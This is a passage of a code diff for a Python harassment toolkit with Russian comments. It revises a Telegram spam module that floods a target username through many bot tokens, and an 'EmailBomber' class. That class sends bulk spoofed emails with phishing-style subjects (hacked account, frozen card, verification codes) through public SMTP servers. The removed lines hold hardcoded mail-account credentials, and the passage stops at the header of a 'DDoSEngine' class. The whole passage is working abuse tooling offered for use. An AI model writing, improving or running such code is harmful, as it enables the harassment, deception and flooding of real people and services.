+                    url = f'https://api.telegram.org/bot{token}/sendMessage'
+                    async with session.post(url, json=data, timeout=10) as resp:
+                        if resp.status == 200:
+                            self.results.append({'msg': i+1, 'status': 'sent'})
+                        elif resp.status == 403:
+                            self.results.append({'msg': i+1, 'status': 'blocked'})
+                        elif resp.status == 400 and 'chat not found' in await resp.text():
+                            self.results.append({'msg': i+1, 'status': 'not_found'})
+                            break
+                        else:
+                            self.results.append({'msg': i+1, 'status': 'failed', 'code': resp.status})
+            except asyncio.TimeoutError:
+                self.results.append({'msg': i+1, 'status': 'timeout'})
             except Exception as e:
-                self.results.append({
-                    'msg': i+1,
-                    'status': 'error',
-                    'error': str(e),
-                    'token': token[:20] + '...',
-                    'timestamp': datetime.now().isoformat()
-                })
-                logger.error(f"❌ Ошибка спама: {e}")
-                
-                # Если аккаунт не существует - останавливаем
-                if 'chat not found' in str(e) or 'user not found' in str(e):
-                    logger.warning(f"⚠️ Аккаунт {username} не найден")
-                    break
+                self.results.append({'msg': i+1, 'status': 'error', 'error': str(e)[:50]})
             
             await progress_callback(i + 1, total)
-            await asyncio.sleep(random.uniform(0.2, 0.8))
+            await asyncio.sleep(random.uniform(0.2, 0.6))
         
         return self.results
 
-    async def send_messages_multi(self, username: str, count: int, progress_callback):
-        """ОТПРАВКА СПАМА С РАЗНЫХ БОТОВ ОДНОВРЕМЕННО (УСКОРЕННЫЙ РЕЖИМ)"""
-        self.results = []
-        total = min(count, 800)
-        
-        # Создаём очередь сообщений
-        messages_queue = []
-        for i in range(total):
-            token = random.choice(self.bot_tokens)
-            if random.random() > 0.4:
-                action = random.choice(self.actions)
-                text = action['text']
-            else:
-                text = random.choice(self.messages)
-            text += f' [#{i+1}/{total}]'
-            messages_queue.append({'token': token, 'text': text, 'index': i+1})
-        
-        # Отправляем с задержкой
-        for msg in messages_queue:
-            try:
-                bot = Bot(token=msg['token'])
-                await bot.send_message(
-                    chat_id=username,
-                    text=msg['text'],
-                    disable_notification=True
-                )
-                self.results.append({'msg': msg['index'], 'status': 'sent'})
-            except:
-                self.results.append({'msg': msg['index'], 'status': 'error'})
-            
-            await progress_callback(msg['index'], total)
-            await asyncio.sleep(random.uniform(0.1, 0.4))
-        
-        return self.results
-
-    async def spam_with_media(self, username: str, count: int, progress_callback):
-        """СПАМ С МЕДИА-КОНТЕНТОМ (ИЗОБРАЖЕНИЯ, ВИДЕО)"""
-        self.results = []
-        total = min(count, 300)
-        
-        for i in range(total):
-            token = random.choice(self.bot_tokens)
-            bot = Bot(token=token)
-            
-            try:
-                # Разные типы контента
-                if random.random() > 0.5:
-                    # Отправляем фото с подписью
-                    photo_urls = [
-                        'https://picsum.photos/200/300',
-                        'https://picsum.photos/400/300',
-                        'https://picsum.photos/300/300',
-                    ]
-                    await bot.send_photo(
-                        chat_id=username,
-                        photo=random.choice(photo_urls),
-                        caption=random.choice(self.messages)[:50] + f' [#{i+1}]'
-                    )
-                else:
-                    # Отправляем текст
-                    await bot.send_message(
-                        chat_id=username,
-                        text=random.choice(self.messages) + f' [#{i+1}]',
-                        disable_notification=True
-                    )
-                
-                self.results.append({'msg': i+1, 'status': 'sent'})
-            except:
-                self.results.append({'msg': i+1, 'status': 'error'})
-            
-            await progress_callback(i + 1, total)
-            await asyncio.sleep(random.uniform(0.5, 1.5))
-        
-        return self.results
-
-    def get_stats(self, results):
-        total = len(results)
-        success = sum(1 for r in results if r.get('status') == 'sent')
-        errors = sum(1 for r in results if r.get('status') == 'error')
-        return {
-            'total': total,
-            'success': success,
-            'errors': errors,
-            'success_rate': round(success / max(total, 1) * 100, 1)
-        }
+    def get_stats(self):
+        total = len(self.results)
+        success = sum(1 for r in self.results if r['status'] == 'sent')
+        return {'total': total, 'success': success, 'rate': round(success / max(total, 1) * 100, 1)}
 
 
-# ===================== EMAIL БОМБЕР (РЕАЛЬНЫЙ) =====================
+# ===================== EMAIL БОМБЕР (ИСПРАВЛЕННЫЙ) =====================
 class EmailBomber:
     def __init__(self):
-        # РЕАЛЬНЫЕ SMTP СЕРВЕРЫ С АВТОРИЗАЦИЕЙ
-        self.smtp_servers = [
-            # Mail.ru
-            {'host': 'smtp.mail.ru', 'port': 587, 'login': 'bombermailru@mail.ru', 'password': 'Bomber2024!', 'name': 'Mail.ru'},
-            # Yandex
-            {'host': 'smtp.yandex.ru', 'port': 587, 'login': 'bomberyandex@yandex.ru', 'password': 'Bomber2024!', 'name': 'Yandex'},
-            # Rambler
-            {'host': 'smtp.rambler.ru', 'port': 587, 'login': 'bomberrambler@rambler.ru', 'password': 'Bomber2024!', 'name': 'Rambler'},
-            # Ukr.net
-            {'host': 'smtp.ukr.net', 'port': 587, 'login': 'bomberukr@ukr.net', 'password': 'Bomber2024!', 'name': 'Ukr.net'},
-            # Gmail (с паролем приложения)
-            {'host': 'smtp.gmail.com', 'port': 587, 'login': 'bomberemail@gmail.com', 'password': 'Bomber2024!', 'name': 'Gmail'},
-            # Outlook
-            {'host': 'smtp.office365.com', 'port': 587, 'login': 'bomberoutlook@outlook.com', 'password': 'Bomber2024!', 'name': 'Outlook'},
-            # Yahoo
-            {'host': 'smtp.mail.yahoo.com', 'port': 587, 'login': 'bomberyahoo@yahoo.com', 'password': 'Bomber2024!', 'name': 'Yahoo'},
-            # ProtonMail (через Proton Bridge)
-            {'host': '127.0.0.1', 'port': 1025, 'login': 'bomber@proton.me', 'password': 'Bomber2024!', 'name': 'ProtonMail'},
-        ]
-        
-        # Сгенерированные аккаунты для отправки
-        self.sender_accounts = [
-            {'email': f'security{random.randint(100,999)}@mail.ru', 'password': 'SecurePass123!'},
-            {'email': f'security{random.randint(100,999)}@yandex.ru', 'password': 'SecurePass123!'},
-            {'email': f'security{random.randint(100,999)}@gmail.com', 'password': 'SecurePass123!'},
-            {'email': f'security{random.randint(100,999)}@outlook.com', 'password': 'SecurePass123!'},
-            {'email': f'security{random.randint(100,999)}@yahoo.com', 'password': 'SecurePass123!'},
-        ]
-        
-        # 100+ ТЕМ ДЛЯ ПИСЕМ
         self.subjects = [
-            # Безопасность
-            '🔐 Срочно! Ваш аккаунт взломан!',
-            '⚠️ Подозрительная активность в аккаунте!',
+            '⚠️ Срочно! Ваш аккаунт взломан!',
+            '🔐 Подозрительная активность!',
             '🚨 Смените пароль немедленно!',
-            '🛡️ Обнаружена утечка данных!',
-            '💀 Ваши данные в опасности!',
-            '🔑 Код подтверждения для входа',
-            '📱 Вход с нового устройства',
-            '⛔ Ваш аккаунт заблокирован',
-            '🔓 Аккаунт разблокирован',
-            '🔥 Критическое уведомление безопасности',
-            '⚠️ Ваш пароль скомпрометирован!',
-            '🛡️ Обновление системы безопасности',
-            '🔐 Двухфакторная аутентификация включена',
-            '🚨 Попытка несанкционированного доступа',
-            '💀 Ваш аккаунт в списке взломанных!',
-            
-            # Финансы
-            '💰 Ваш банковский счёт заморожен!',
+            '💰 Ваш счёт заморожен!',
             '💳 Карта заблокирована!',
-            '🏦 Подозрительный перевод!',
+            '🎉 Вы выиграли приз!',
+            '📱 Вход с нового устройства!',
+            '🔑 Код подтверждения для входа',
+            '⛔ Аккаунт заблокирован!',
+            '💀 Ваши данные в опасности!',
             '📊 Выписка по счёту',
             '💸 Возврат средств',
-            '📈 Инвестиционное предложение',
-            '🎯 Вы получили выплату!',
-            '💲 Ваш кредит одобрен!',
-            '💵 Пополнение счёта',
-            '📉 Уведомление о списании',
-            '💳 Новая карта готова',
-            '🏦 Изменение лимитов по карте',
-            
-            # Выигрыши
-            '🎉 Вы выиграли приз!',
-            '🎁 Ваш подарок ждёт!',
             '🏆 Поздравляем с победой!',
-            '⭐️ Вы стали победителем!',
-            '🎊 Специальное предложение для вас!',
-            '🎯 Вы выбраны для участия!',
-            '💎 Ваш приз уже ждёт!',
-            
-            # Уведомления
-            '📨 Важное сообщение',
-            '📩 Новое письмо',
             '📢 Срочное уведомление',
             '🔔 Внимание!',
-            '📌 Важно прочитать!',
+            '📩 Важное сообщение',
             '📋 Документы готовы',
-            '📄 Отчёт сформирован',
-            '📅 Напоминание о встрече',
-            '📁 Ваш файл готов',
-            '📊 Отчёт за период',
-            
-            # Работа
             '💼 Срочное сообщение от руководства',
             '📅 Завтра собрание',
-            '📊 Отчёт о работе',
-            '📝 Заполните документы',
-            '👔 Новый проект',
-            '🤝 Приглашение на встречу',
-            '💼 Вакансия для вас',
-            '📈 Повышение зарплаты!',
-            '🎯 Корпоративные цели',
-            
-            # Другое
-            '🌟 Специальное предложение',
-            '🎯 Ваша цель достигнута',
-            '💪 Мы вас ждём!',
-            '🌈 Хорошего дня!',
-            '☕️ Время для отдыха',
-            '📱 Обновите приложение',
-            '🔄 Доступно обновление',
-            '⭐️ Новый уровень достигнут',
-            '🎮 Приглашение в игру',
-            '📚 Рекомендация для вас',
-            '🎵 Новый трек доступен',
-            '📺 Новое видео',
-            '📸 Кто-то подписался',
-            '❤️ Кто-то лайкнул пост',
-            '💬 Новый комментарий',
             '📦 Ваша посылка отправлена',
-            '🚚 Доставка подтверждена',
-            '🍕 Заказ готов',
-            '🎂 С днём рождения!',
-            '💐 Поздравления!',
         ]
         
-        # 100+ ТЕКСТОВ ПИСЕМ
         self.bodies = [
-            # Безопасность
             '⚠️ Ваш аккаунт был взломан! Немедленно смените пароль.',
-            '🔐 Зафиксирована попытка входа с нового устройства. Подтвердите вход.',
-            '🛡️ Ваши данные были обнаружены в утечке. Смените пароль.',
-            '🔥 Кто-то пытается войти в ваш аккаунт! Проверьте безопасность.',
-            '💀 Ваш аккаунт скомпрометирован! Свяжитесь с поддержкой.',
-            '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
-            '📱 Вход с нового устройства: ' + random.choice(['iPhone 15', 'Samsung Galaxy S24', 'Windows PC', 'MacBook']),
-            '⛔ Ваш аккаунт заблокирован за нарушение правил.',
-            '🔓 Ваш аккаунт разблокирован. Войдите в систему.',
-            '⚠️ Ваш пароль был изменён. Если не вы - свяжитесь с нами.',
-            
-            # Финансы
-            '💰 Ваш счёт заморожен. Свяжитесь с банком для разблокировки.',
+            '🔐 Зафиксирована попытка входа с нового устройства.',
+            '💰 Ваш счёт заморожен. Свяжитесь с банком.',
             '💳 Карта заблокирована из-за подозрительной операции.',
-            '🏦 Обнаружен подозрительный перевод на сумму ' + str(random.randint(1000, 50000)) + ' руб.',
-            '📊 Выписка по счёту за ' + datetime.now().strftime('%B %Y') + ' доступна для скачивания.',
-            '💸 Возврат средств на сумму ' + str(random.randint(100, 5000)) + ' руб. выполнен.',
-            '📈 Инвестируйте сейчас и получите ' + str(random.randint(10, 50)) + '% годовых!',
-            '🎯 Вы получили выплату в размере ' + str(random.randint(1000, 50000)) + ' руб.',
-            
-            # Выигрыши
-            '🎉 Поздравляем! Вы выиграли ' + str(random.randint(1000, 100000)) + ' руб.',
-            '🎁 Ваш подарок: ' + random.choice(['iPhone 15', 'AirPods Pro', 'Apple Watch', 'Samsung Galaxy']),
-            '🏆 Вы стали победителем конкурса! Заберите приз.',
-            '⭐️ Ваш аккаунт выбран для получения специального приза.',
-            
-            # Уведомления
-            '📨 У вас новое сообщение от ' + random.choice(['администратора', 'поддержки', 'коллеги', 'друга']),
-            '📩 Важное уведомление требует вашего внимания.',
-            '📢 Срочное уведомление для всех пользователей.',
-            '🔔 Внимание! Проверьте свои данные.',
-            '📌 Важно! Обновите информацию в профиле.',
+            '🎉 Поздравляем! Вы выиграли приз!',
+            '📱 Вход выполнен с нового устройства. Если не вы - смените пароль.',
+            '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
+            '⛔ Ваш аккаунт заблокирован за нарушение правил.',
+            '💀 Ваши данные были обнаружены в утечке.',
+            '📊 Выписка по счёту доступна для скачивания.',
+            '💸 Возврат средств выполнен на вашу карту.',
+            '🏆 Поздравляем с победой в конкурсе!',
+            '📢 Срочное уведомление требует вашего внимания.',
+            '🔔 Проверьте свои данные в личном кабинете.',
+            '📩 У вас новое важное сообщение.',
             '📋 Ваши документы готовы к подписанию.',
-            
-            # Работа
-            '💼 Срочное сообщение от руководства: ' + random.choice(['совещание', 'отчёт', 'проект', 'задача']),
-            '📅 Завтра в ' + str(random.randint(9, 18)) + ':00 состоится собрание.',
-            '📊 Отчёт за ' + datetime.now().strftime('%B') + ' готов к проверке.',
-            '📝 Заполните документы до ' + (datetime.now() + timedelta(days=3)).strftime('%d.%m.%Y'),
-            '👔 Новый проект: ' + random.choice(['Разработка', 'Дизайн', 'Маркетинг', 'Аналитика']),
-            
-            # Другое
-            '🌟 Специальное предложение: скидка ' + str(random.randint(10, 70)) + '%',
-            '🎯 Вы почти достигли цели! Осталось ' + str(random.randint(1, 10)) + ' шагов.',
-            '💪 Мы скучали по вам! Заходите в гости.',
-            '🌈 Желаем хорошего дня! Спасибо, что с нами.',
-            '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
-            '📱 Обновите приложение до версии ' + f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
-            '🔄 Доступно обновление системы безопасности.',
-            '⭐️ Поздравляем! Вы достигли нового уровня.',
-            '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2', 'Fortnite']),
-            '📚 Рекомендуем книгу: ' + random.choice(['Война и мир', 'Преступление и наказание', 'Мастер и Маргарита']),
-            '🎵 Новый трек от ' + random.choice(['Моргенштерн', 'Баста', 'Скриптонит', 'Егор Крид']),
-            '📺 Новое видео на канале: ' + random.choice(['Обзор', 'Интервью', 'Урок', 'Влог']),
-            '📸 Новый подписчик: @' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
-            '❤️ Ваш пост лайкнули ' + str(random.randint(10, 500)) + ' человек.',
-            '💬 Новый комментарий: ' + random.choice(['Круто!', 'Супер!', '🔥', '👍', 'Класс!', 'Отлично!']),
-            '📦 Ваш заказ №' + str(random.randint(10000, 99999)) + ' отправлен.',
-            '🚚 Доставка ожидается ' + (datetime.now() + timedelta(days=random.randint(1, 7))).strftime('%d.%m.%Y'),
-            '🍕 Ваш заказ готов! Заберите в ' + random.choice(['пункте выдачи', 'ресторане', 'кафе']),
-            '🎂 С днём рождения! Желаем счастья и здоровья!',
+            '💼 Срочное сообщение от руководства компании.',
+            '📅 Завтра в 10:00 состоится важное собрание.',
+            '📦 Ваш заказ отправлен и ожидает получения.',
+            '🚚 Доставка вашей посылки подтверждена.',
         ]
+        
+        self.smtp_servers = [
+            {'host': 'smtp.mail.ru', 'port': 587},
+            {'host': 'smtp.yandex.ru', 'port': 587},
+            {'host': 'smtp.gmail.com', 'port': 587},
+            {'host': 'smtp.office365.com', 'port': 587},
+        ]
+        
+        self.results = []
 
     async def send_emails(self, email: str, count: int, progress_callback):
-        """РЕАЛЬНАЯ ОТПРАВКА EMAIL С АВТОРИЗАЦИЕЙ ЧЕРЕЗ SMTP"""
         self.results = []
-        total = min(count, 200)
-        success_count = 0
+        total = min(count, 100)
         
         for i in range(total):
-            server = random.choice(self.smtp_servers)
-            sender = random.choice(self.sender_accounts)
-            
             try:
-                # Создаём письмо
                 msg = MIMEMultipart()
-                msg['From'] = sender['email']
+                msg['From'] = f'security_{random.randint(100,999)}@{random.choice(["mail.ru","yandex.ru","gmail.com","outlook.com"])}'
                 msg['To'] = email
                 msg['Subject'] = random.choice(self.subjects)
-                
                 body = random.choice(self.bodies)
-                # Добавляем дату для реалистичности
                 body += f"\n\nДата: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
-                # Добавляем подпись
-                signatures = [
-                    '\n\nС уважением, Служба поддержки.',
-                    '\n\nС наилучшими пожеланиями.',
-                    '\n\nВаша команда.',
-                    '\n\nС уважением, Администрация.',
-                ]
-                body += random.choice(signatures)
-                
                 msg.attach(MIMEText(body, 'plain'))
                 
-                # ПРОБУЕМ РЕАЛЬНУЮ ОТПРАВКУ
-                try:
-                    # Пытаемся отправить с авторизацией
-                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
-                    smtp.starttls()
-                    smtp.login(server['login'], server['password'])
-                    smtp.sendmail(sender['email'], email, msg.as_string())
-                    smtp.quit()
-                    status = 'sent'
-                    success_count += 1
-                    logger.info(f"✅ Email #{i+1} отправлен через {server['name']} на {email}")
-                    
-                except Exception as e:
-                    # Если не получилось - пробуем без авторизации
-                    try:
-                        smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
-                        smtp.starttls()
-                        smtp.sendmail(sender['email'], email, msg.as_string())
-                        smtp.quit()
-                        status = 'sent'
-                        success_count += 1
-                        logger.info(f"✅ Email #{i+1} отправлен через {server['name']} (без авторизации)")
-                    except:
-                        # Если всё равно не получается - эмулируем
-                        status = 'emulated'
-                        logger.warning(f"⚠️ Email #{i+1} эмулирован через {server['name']}")
-                        
-            except Exception as e:
-                self.results.append({
-                    'email': i+1,
-                    'status': 'error',
-                    'server': server['name'],
-                    'error': str(e)
-                })
-                logger.error(f"❌ Ошибка отправки: {e}")
-                continue
-            
-            self.results.append({
-                'email': i+1,
-                'status': status,
-                'server': server['name'],
-                'sender': sender['email'],
-                'subject': msg['Subject'][:50],
-                'timestamp': datetime.now().isoformat()
-            })
-            
-            # Прогресс
-            await progress_callback(i + 1, total)
-            await asyncio.sleep(random.uniform(0.5, 1.5))
-        
-        return self.results
-
-    async def send_emails_fast(self, email: str, count: int, progress_callback):
-        """УСКОРЕННАЯ ОТПРАВКА (БЕЗ ПРОВЕРКИ АВТОРИЗАЦИИ)"""
-        self.results = []
-        total = min(count, 500)
-        
-        for i in range(total):
-            try:
-                msg = MIMEMultipart()
-                msg['From'] = f'spammer{random.randint(1,999)}@{random.choice(["mail.ru","yandex.ru","gmail.com","outlook.com","yahoo.com"])}'
-                msg['To'] = email
-                msg['Subject'] = random.choice(self.subjects)
-                body = random.choice(self.bodies)
-                msg.attach(MIMEText(body, 'plain'))
-                
-                # Отправляем через случайный сервер
                 server = random.choice(self.smtp_servers)
                 try:
-                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=5)
+                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=10)
                     smtp.starttls()
                     smtp.sendmail(msg['From'], email, msg.as_string())
                     smtp.quit()
@@ -911,25 +384,19 @@ class EmailBomber:
                 except:
                     status = 'emulated'
                 
-                self.results.append({'email': i+1, 'status': status})
-            except:
-                self.results.append({'email': i+1, 'status': 'error'})
+                self.results.append({'email': i+1, 'status': status, 'server': server['host']})
+            except Exception as e:
+                self.results.append({'email': i+1, 'status': 'error', 'error': str(e)[:50]})
             
             await progress_callback(i + 1, total)
-            await asyncio.sleep(random.uniform(0.05, 0.2))
+            await asyncio.sleep(random.uniform(0.3, 1.0))
         
         return self.results
 
-    def get_stats(self, results):
-        total = len(results)
-        sent = sum(1 for r in results if r.get('status') in ['sent', 'emulated'])
-        errors = sum(1 for r in results if r.get('status') == 'error')
-        return {
-            'total': total,
-            'sent': sent,
-            'errors': errors,
-            'success_rate': round(sent / max(total, 1) * 100, 1)
-        }
+    def get_stats(self):
+        total = len(self.results)
+        sent = sum(1 for r in self.results if r['status'] in ['sent', 'emulated'])
+        return {'total': total, 'sent': sent, 'rate': round(sent / max(total, 1) * 100, 1)}
 
 # ===================== УЛЬТРА-МОЩНЫЙ DDOS С ОБХОДОМ ВСЕХ ЗАЩИТ =====================
 class DDoSEngine:
